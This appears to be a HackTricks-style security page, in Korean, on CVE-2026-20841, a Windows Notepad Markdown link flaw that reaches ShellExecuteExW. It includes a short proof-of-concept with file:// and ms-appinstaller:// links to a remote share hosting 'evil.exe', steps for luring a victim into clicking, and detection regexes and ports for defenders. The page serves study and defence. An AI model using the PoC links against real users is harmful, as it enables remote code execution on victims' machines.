# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown/HTML을 렌더링하는 최신 Windows 애플리케이션은 사용자가 제공한 링크를 클릭 가능한 요소로 변환한 뒤 `ShellExecuteExW`에 전달하는 경우가 많습니다. scheme allowlisting이 엄격하지 않으면 등록된 모든 protocol handler(예: `file:`, `ms-appinstaller:`)가 트리거될 수 있으며, 이로 인해 현재 사용자 context에서 code execution이 발생할 수 있습니다.<sup>[[1]](#references)</sup>

## Windows Notepad Markdown mode의 ShellExecuteExW surface
- Notepad는 `sub_1400ED5D0()`의 고정 문자열 비교를 통해 **`.md` 확장자에서만** Markdown mode를 선택합니다.<sup>[[1]](#references)</sup>
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (`[target](target)`로 렌더링됨)이므로 payload와 detection에는 두 syntax가 모두 중요합니다.
- Link click은 `sub_140170F60()`에서 처리되며, 이 함수는 약한 filtering을 수행한 후 `ShellExecuteExW`를 호출합니다.
- `ShellExecuteExW`는 HTTP(S)뿐만 아니라 **구성된 모든 protocol handler**로 dispatch합니다.<sup>[[1]](#references)</sup>

### Payload 고려 사항
- 링크 내의 모든 `\\` sequence는 `ShellExecuteExW` 전에 **`\`로 normalize**되며, UNC/path crafting 및 detection에 영향을 줍니다.
- `.md` files는 기본적으로 Notepad와 **associate되어 있지 않습니다**. 따라서 victim은 여전히 해당 file을 Notepad에서 열고 link를 click해야 하지만, 일단 렌더링되면 link는 click할 수 있습니다.
- Dangerous example schemes:<sup>[[1]](#references)</sup>
- `file://`을 사용해 local/UNC payload를 launch합니다.
- `ms-appinstaller://`를 사용해 App Installer flow를 trigger합니다. 로컬에 등록된 다른 scheme도 abuse할 수 있습니다.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Notepad이 Markdown으로 렌더링하도록 **`.md` 파일**을 작성합니다.
2. 위험한 URI scheme(`file:`, `ms-appinstaller:` 또는 설치된 handler)을 사용하여 링크를 삽입합니다.
3. 파일을 전송하고(HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 또는 유사한 방식) 사용자가 Notepad에서 열도록 유도합니다.
4. 클릭하면 **normalized link**가 `ShellExecuteExW`로 전달되고 해당 protocol handler가 사용자 context에서 참조된 content를 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- 문서를 전송하는 데 일반적으로 사용되는 포트/프로토콜을 통해 `.md` 파일이 전송되는지 모니터링합니다: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown 링크(standard 및 autolink)를 파싱하고 **case-insensitive** `file:` 또는 `ms-appinstaller:`를 찾습니다.
- 원격 resource access를 탐지하기 위한 Vendor-guided regexes:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- 패치 동작은 **로컬 파일과 HTTP(S)를 allowlist에 등록**하는 것으로 보고되었으며, `ShellExecuteExW`에 도달하는 그 외의 모든 항목은 의심스럽습니다. 공격 표면은 시스템마다 다르므로, 필요에 따라 설치된 다른 protocol handler에 대한 탐지도 확장해야 합니다.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad의 임의 코드 실행](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
